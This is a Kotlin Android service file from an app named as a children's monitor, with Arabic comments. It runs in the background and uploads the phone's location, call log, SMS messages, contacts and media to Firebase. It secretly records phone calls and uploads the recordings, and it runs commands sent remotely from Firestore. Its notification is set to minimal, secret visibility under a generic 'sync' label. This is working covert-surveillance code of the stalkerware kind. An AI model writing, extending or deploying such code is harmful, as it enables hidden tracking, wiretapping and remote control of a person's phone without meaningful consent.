package com.kids.monitor

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.database.ContentObserver
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.Network
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.provider.Telephony
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.firestore.SetOptions
import com.kids.monitor.data.Collectors
import com.kids.monitor.data.CommandExecutor
import com.kids.monitor.data.DeviceInfo
import com.kids.monitor.data.FirestoreSync
import com.kids.monitor.data.LocationCollector
import com.kids.monitor.data.PendingStore
import com.kids.monitor.data.Permissions
import com.kids.monitor.data.StorageUploader
import java.io.File

/** خدمة Foreground للمزامنة الدورية واستقبال الأوامر وتسجيل المكالمات. */
class MonitorService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private var commandsListener: ListenerRegistration? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var contentObserver: ContentObserver? = null
    private var telephony: TelephonyManager? = null
    private var phoneListener: PhoneStateListener? = null
    private var recorder: MediaRecorder? = null
    private var recordingFile: File? = null
    private var recordingNumber: String? = null

    private val syncTask = object : Runnable {
        override fun run() {
            syncStatus()
            handler.postDelayed(this, SYNC_INTERVAL_MS)
        }
    }

    private val relayTask = object : Runnable {
        override fun run() {
            relayData()
            handler.postDelayed(this, RELAY_INTERVAL_MS)
        }
    }

    override fun onCreate() {
        super.onCreate()
        FirestoreSync.init(this)
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) {
            stopSelf()
            return START_NOT_STICKY
        }
        if (FirebaseAuth.getInstance().currentUser == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val type = if (Permissions.has(this, Manifest.permission.RECORD_AUDIO)) {
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            } else {
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            }
            startForeground(NOTIFICATION_ID, buildNotification("المزامنة تعمل"), type)
        } else {
            startForeground(NOTIFICATION_ID, buildNotification("المزامنة تعمل"))
        }
        prefs().edit().putBoolean(SHARING_ENABLED, true).apply()

        handler.removeCallbacks(syncTask)
        handler.post(syncTask)
        handler.removeCallbacks(relayTask)
        handler.postDelayed(relayTask, RELAY_INTERVAL_MS)

        listenCommands()
        registerNetworkCallback()
        registerContentObservers()
        registerCallRecorder()

        if (intent?.action == ACTION_SYNC) {
            syncStatus()
        }
        return START_STICKY
    }

    override fun onDestroy() {
        handler.removeCallbacks(syncTask)
        handler.removeCallbacks(relayTask)
        commandsListener?.remove()
        commandsListener = null
        if (networkCallback != null) {
            try {
                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                cm.unregisterNetworkCallback(networkCallback!!)
            } catch (e: Exception) {
                // تجاهل
            }
            networkCallback = null
        }
        if (contentObserver != null) {
            try { contentResolver.unregisterContentObserver(contentObserver!!) } catch (e: Exception) { /* تجاهل */ }
            contentObserver = null
        }
        if (phoneListener != null) {
            try { telephony?.listen(phoneListener!!, PhoneStateListener.LISTEN_NONE) } catch (e: Exception) { /* تجاهل */ }
            phoneListener = null
        }
        stopCallRecording()
        prefs().edit().putBoolean(SHARING_ENABLED, false).apply()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun prefs(): SharedPreferences = getSharedPreferences(PREFERENCES, MODE_PRIVATE)

    private fun syncStatus() {
        if (FirebaseAuth.getInstance().currentUser == null) {
            stopSelf()
            return
        }
        val online = DeviceInfo.online(this)
        flushPending()
        FirestoreSync.updateStatus(this, DeviceInfo.status(this, online))

        val location = LocationCollector.lastLocation(this)
        if (location != null) {
            if (online) FirestoreSync.writeLocation(this, location)
            else {
                val queued = location.toMutableMap()
                queued["timestamp"] = System.currentTimeMillis()
                PendingStore.addMap(this, queued)
            }
        }
        updateNotification(
            if (online) "المزامنة تعمل · البطارية ${DeviceInfo.battery(this)}٪"
            else "لا يوجد إنترنت · حفظ محلي",
        )
    }

    private fun flushPending() {
        val items = PendingStore.drain(this)
        if (items.isEmpty()) return
        val uid = FirestoreSync.uid() ?: return
        val did = FirestoreSync.deviceId(this)
        var lastLat = 0.0
        var lastLng = 0.0
        var lastTs: Any = System.currentTimeMillis()
        for (obj in items) {
            val map = HashMap<String, Any>()
            for (key in obj.keys()) map[key] = obj.opt(key) ?: ""
            FirestoreSync.subRef(uid, did, "locations").add(map)
            lastLat = obj.optDouble("lat")
            lastLng = obj.optDouble("lng")
            lastTs = obj.opt("timestamp") ?: lastTs
        }
        FirestoreSync.deviceRef(uid, did).set(
            mapOf("location" to mapOf("lat" to lastLat, "lng" to lastLng, "timestamp" to lastTs)),
            SetOptions.merge(),
        )
    }

    /** مزامنة دورية للمكالمات والرسائل وجهات الاتصال والوسائط. */
    private fun relayData() {
        Thread {
            if (!DeviceInfo.online(this)) return@Thread
            syncRecentData()
            val last = prefs().getLong(LAST_RELAY_AT, 0L)

            if (!prefs().getBoolean(CONTACTS_SYNCED, false) &&
                Permissions.has(this, Manifest.permission.READ_CONTACTS)
            ) {
                Collectors.contacts(this).forEach { FirestoreSync.appendItem(this, "contacts", it) }
                prefs().edit().putBoolean(CONTACTS_SYNCED, true).apply()
            }

            if (Permissions.mediaPermissions().any { Permissions.has(this, it) }) {
                val uploaded = prefs().getStringSet(UPLOADED_MEDIA, emptySet()) ?: emptySet()
                val newUploaded = HashSet(uploaded)
                Collectors.media(this).filter { (it["timestamp"] as? Long) ?: 0L > last }
                    .forEach { item ->
                        var entry = item
                        val id = item["id"] as? Long
                        val type = item["type"] as? String ?: ""
                        val name = item["name"] as? String ?: ""
                        val path = item["path"] as? String ?: ""
                        val looksLikeRecording = name.contains("record", true) ||
                            name.contains("call", true) ||
                            path.contains("record", true) ||
                            path.contains("call", true)
                        if (type == "audio" && id != null && looksLikeRecording &&
                            !uploaded.contains(id.toString())
                        ) {
                            val base = item["collection"] as? String ?: ""
                            if (base.isNotBlank()) {
                                val uri = android.net.Uri.withAppendedPath(
                                    android.net.Uri.parse(base),
                                    id.toString(),
                                )
                                val url = StorageUploader.uploadUri(this, uri, "recordings/$name")
                                if (url != null) {
                                    entry = item + ("url" to url)
                                    newUploaded.add(id.toString())
                                }
                            }
                        }
                        FirestoreSync.appendItem(this, "media", entry)
                    }
                prefs().edit().putStringSet(UPLOADED_MEDIA, newUploaded).apply()
            }
            prefs().edit().putLong(LAST_RELAY_AT, System.currentTimeMillis()).apply()
        }.start()
    }

    /** مزامنة فورية عند تغيّر سجل المكالمات أو الرسائل. */
    private fun syncRecentData() {
        if (!DeviceInfo.online(this)) return
        val last = prefs().getLong(LAST_RELAY_AT, 0L)
        if (Permissions.has(this, Manifest.permission.READ_CALL_LOG)) {
            Collectors.callLog(this).filter { (it["timestamp"] as? Long) ?: 0L > last }
                .forEach { FirestoreSync.appendItem(this, "calls", it) }
        }
        if (Permissions.has(this, Manifest.permission.READ_SMS)) {
            Collectors.messages(this).filter { (it["timestamp"] as? Long) ?: 0L > last }
                .forEach { FirestoreSync.appendItem(this, "messages", it) }
        }
    }

    private fun listenCommands() {
        if (commandsListener != null) return
        commandsListener = FirestoreSync.listenCommands(this) { commandId, data ->
            val type = data["type"]?.toString() ?: return@listenCommands
            @Suppress("UNCHECKED_CAST")
            val payload = data["payload"] as? Map<String, Any> ?: emptyMap()
            Thread {
                val result = CommandExecutor.execute(this, type, payload)
                val success = result["ok"] == true
                FirestoreSync.setCommandResult(this, commandId, if (success) "done" else "failed", result)
            }.start()
        }
    }

    private fun registerNetworkCallback() {
        if (networkCallback != null) return
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                handler.post { flushPending(); syncStatus() }
            }
        }
        try {
            cm.registerDefaultNetworkCallback(callback)
            networkCallback = callback
        } catch (e: Exception) {
            // تجاهل
        }
    }

    private fun registerContentObservers() {
        if (contentObserver != null) return
        val observer = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean) {
                Thread { syncRecentData(); prefs().edit().putLong(LAST_RELAY_AT, System.currentTimeMillis()).apply() }.start()
            }
        }
        try {
            contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, observer)
            contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, observer)
            contentObserver = observer
        } catch (e: Exception) {
            // تجاهل
        }
    }

    // ---------- تسجيل المكالمات ----------

    private fun registerCallRecorder() {
        if (phoneListener != null) return
        if (!Permissions.has(this, Manifest.permission.READ_PHONE_STATE)) return
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return
        val listener = object : PhoneStateListener() {
            @Deprecated("Deprecated in Java")
            override fun onCallStateChanged(state: Int, incomingNumber: String?) {
                when (state) {
                    TelephonyManager.CALL_STATE_RINGING -> recordingNumber = incomingNumber
                    TelephonyManager.CALL_STATE_OFFHOOK -> startCallRecording()
                    TelephonyManager.CALL_STATE_IDLE -> stopCallRecording()
                }
            }
        }
        try {
            tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE)
            telephony = tm
            phoneListener = listener
        } catch (e: Exception) {
            // تجاهل
        }
    }

    private fun startCallRecording() {
        if (!prefs().getBoolean(CALL_RECORDER, false)) return
        if (!Permissions.has(this, Manifest.permission.RECORD_AUDIO)) return
        if (recorder != null) return
        try {
            val file = File(cacheDir, "call_${System.currentTimeMillis()}.m4a")
            @Suppress("DEPRECATION")
            val mr = MediaRecorder()
            mr.setAudioSource(MediaRecorder.AudioSource.MIC)
            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            mr.setAudioEncodingBitRate(96000)
            mr.setAudioSamplingRate(44100)
            mr.setOutputFile(file.absolutePath)
            mr.prepare()
            mr.start()
            recorder = mr
            recordingFile = file
            updateNotification("تسجيل مكالمة جاري…")
        } catch (e: Exception) {
            recorder = null
            recordingFile = null
        }
    }

    private fun stopCallRecording() {
        val mr = recorder ?: return
        try { mr.stop() } catch (e: Exception) { /* تجاهل */ }
        try { mr.release() } catch (e: Exception) { /* تجاهل */ }
        recorder = null
        val file = recordingFile
        recordingFile = null
        val number = recordingNumber
        recordingNumber = null
        if (file != null && file.exists() && file.length() > 0) {
            Thread {
                val url = StorageUploader.uploadSync(file, "recordings/${file.name}")
                if (url != null) {
                    FirestoreSync.appendItem(
                        this,
                        "media",
                        mapOf(
                            "name" to "مكالمة ${number ?: ""}".trim(),
                            "url" to url,
                            "type" to "audio",
                            "mimeType" to "audio/mp4",
                            "size" to file.length(),
                            "timestamp" to System.currentTimeMillis(),
                            "recording" to true,
                            "number" to (number ?: ""),
                        ),
                    )
                }
            }.start()
        }
    }

    // ---------- الإشعار ----------

    private fun updateNotification(message: String) {
        val manager = getSystemService(NotificationManager::class.java) ?: return
        manager.notify(NOTIFICATION_ID, buildNotification(message))
    }

    private fun buildNotification(message: String): Notification {
        val openApp = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        return builder
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentTitle("المزامنة")
            .setContentText(message)
            .setContentIntent(openApp)
            .setPriority(Notification.PRIORITY_MIN)
            .setShowWhen(false)
            .setSound(null)
            .setVisibility(Notification.VISIBILITY_SECRET)
            .setOngoing(true)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "المزامنة",
                NotificationManager.IMPORTANCE_MIN,
            ).apply { description = "مزامنة حالة الجهاز" }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    companion object {
        const val PREFERENCES = "status_sync"
        const val SHARING_ENABLED = "sharing_enabled"
        private const val LAST_RELAY_AT = "last_relay_at"
        private const val CONTACTS_SYNCED = "contacts_synced"
        private const val UPLOADED_MEDIA = "uploaded_media"
        private const val CALL_RECORDER = "call_recorder"
        private const val ACTION_STOP = "com.kids.monitor.STOP_STATUS_SYNC"
        private const val ACTION_SYNC = "com.kids.monitor.SYNC_NOW"
        private const val CHANNEL_ID = "status_sync"
        private const val NOTIFICATION_ID = 1001
        private const val SYNC_INTERVAL_MS = 60 * 1000L
        private const val RELAY_INTERVAL_MS = 5 * 60 * 1000L

        fun start(context: Context) {
            val intent = Intent(context, MonitorService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun syncNow(context: Context) {
            val intent = Intent(context, MonitorService::class.java).setAction(ACTION_SYNC)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }
}
